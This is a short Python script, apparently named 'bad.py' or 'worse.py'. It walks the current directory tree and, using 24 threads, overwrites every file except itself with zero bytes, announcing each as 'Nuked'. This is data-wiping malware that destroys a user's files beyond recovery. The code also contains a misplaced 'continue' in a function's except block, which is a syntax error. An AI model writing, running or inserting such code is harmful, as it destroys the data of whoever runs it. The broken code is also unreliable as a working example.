import os
from concurrent.futures import ThreadPoolExecutor

flist = []

for f in os.listdir():
    if f == "worse.py" or f == "bad.py":
        continue
    if os.path.isfile(f):
        flist.append(f)
    else:
        for root, dirs, files in os.walk(f):
            for file in files:
                flist.append(os.path.join(root, file))
def nuke(i):
    try:
        size = os.path.getsize(i)
        with open(i, 'wb') as g:
            g.write(b'\x00' * size)
            print("Nuked file: ", i)
    except Exception as e:
        print("Error: ", e)
        continue
with ThreadPoolExecutor(max_workers=24) as executor:
    executor.map(nuke, flist)
